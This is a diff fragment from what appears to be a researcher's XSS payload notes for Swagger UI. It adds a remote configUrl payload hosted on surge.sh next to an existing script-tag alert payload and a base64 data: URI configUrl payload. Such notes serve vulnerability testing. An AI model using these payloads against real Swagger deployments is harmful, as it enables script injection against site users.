@@ -9,6 +9,8 @@ https://wpscan.com/vulnerability/c311feef-7041-4c21-9525-132b9bd32f89
 
 #Swagger:
 
+RXSS at `?configUrl=https://jumpy-floor.surge.sh/test.json`
+
 RXSS at `/?url=%3Cscript%3Ealert(atob(%22SGVyZSBpcyB0aGUgWFNT%22))%3C/script%3E`
 
 XSS through configUrl `?configUrl=data:text/html;base64,ewoidXJsIjoiaHR0cHM6Ly9leHViZXJhbnQtaWNlLnN1cmdlLnNoL3Rlc3QueWFtbCIKfQ==`
